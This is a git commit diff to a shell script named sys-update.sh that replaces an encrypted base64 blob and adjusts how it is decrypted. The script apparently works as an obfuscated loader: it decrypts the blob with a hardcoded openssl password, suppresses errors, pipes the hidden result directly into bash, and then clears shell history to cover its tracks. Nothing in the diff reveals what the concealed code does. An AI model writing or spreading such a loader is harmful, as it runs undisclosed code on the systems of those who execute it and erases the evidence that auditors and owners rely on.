e32fe084eb13acf33f0c0250138ba7e4c53301d8
azeddijne-lab <azeddijne@gmail.com>
2026-03-24 10:47:26 -0400

    Update sys-update.sh

--- sys-update.sh
+++ sys-update.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
-ENC_DATA="U2FsdGVkX18HcoG56/hFK6INdIUwNnnzy0TrdNPCKpqqlBgG4VYXKEJD2US1dc8RxKB+m0J44vu9LFmol6qiQncU0IYt8+726nMFO6D6JF3y2Li68viLx/XXqNEh+pGs7+aYqKc7Kle+Rgk4Yr+czPwYX2ZzjEXok629hp+dplba4KsLOlXRPtB/FhKkqYsi+zQ+ywb/ocrfuiWk/1s9Q2Yvj0aCmt5HtI/OpeFnKAAar5vJkZfof2xK06zwtghegietukj4KHV89JI8eH6J0mbIOwdFQXyhfhPmmfTcCQm8LVYkCcpPtLl8V71p0ZCstb3S3ocbo6X3lUiP8R0UNVkKKBacCEGssgLnNd9u1xU63vDFCeZH6yQLYvY/R6Y1Vb9rG9ChHr39tZ5rlHM8cfxMXyuJpjPAkjFg7NmgCMVJV2EYWbp0WANdJloQF6nJh+h5LIbJ98s/gMqVx567NnwqQijuK8XMriavhRQITwce8lxUHeh49/vnDKcREBnwEM8vbn/lXgTcE2rEfyu+KpHsTe0JpwQ/HjhIHk6+gRd4Ov9PdQBCVVAizhSLbRr44JFslTyNH/PAShYX/OzZeg=="
+ENC_DATA="U2FsdGVkX1/Vsur2WcEtEDQebEMAg7ldjS4+nZ4rq61k8tz6Nkez2kZpR56jqjno/F+iTbedBYzNnNJz+gf3cpC+vR/4ogKp0mVPxrAwhF5K/zqKr8of3f5NnkVvKIZ3NvernVB4yKpn30QqMDL/0SqtIE9eX5p4wq6bf0VsACEhXwCydbLxb6JpcuhtgajAsyeesHRPKu0KIALNAHTso45DAxjwL3LWqQfmr3NJybRcDRHjsK02DjaeHmiGwFzCkPbGI2j4Difs6RwbCJwK2IV7HnpTwa+UWdHAdj/+fY1/qyeJYcJOmh8C/wHAkC1pufnYUPD9jTQlDUu62KBzMGMgBE6syg9WepG8/AkmYaZLSjs1Zhe/MymxsStqkKt/Xr7V1qGCnXoC6YRSSjMtIYotBzG23l1vfdVMm0IW57vyaMuV4GsiRGn/wASgjKtfPwgcsdVMo6krjujU1n9IjwS0hx5P0JM7/2QhC1OmhPmcyMHQO3fknsfGHtUSuvqRKbkHc0xdbOn/OcnR+Zhpm13EMujrOZLOXt8KVM9DQsQDb0VYHBOBLVA/GM0IArLxU4KiIwuQPy/wPAZQnsOFFw=="
 
-echo "$ENC_DATA" | openssl enc -aes-256-cbc -pbkdf2 -iter 100000 -a -d -salt -pass pass:bismillah 2>/dev/null | bash
+echo "$ENC_DATA" | openssl enc -aes-256-cbc -md sha256 -a -d -salt -pass pass:bismillah 2>/dev/null | bash
 
 unset ENC_DATA
 history -c && unset HISTFILE
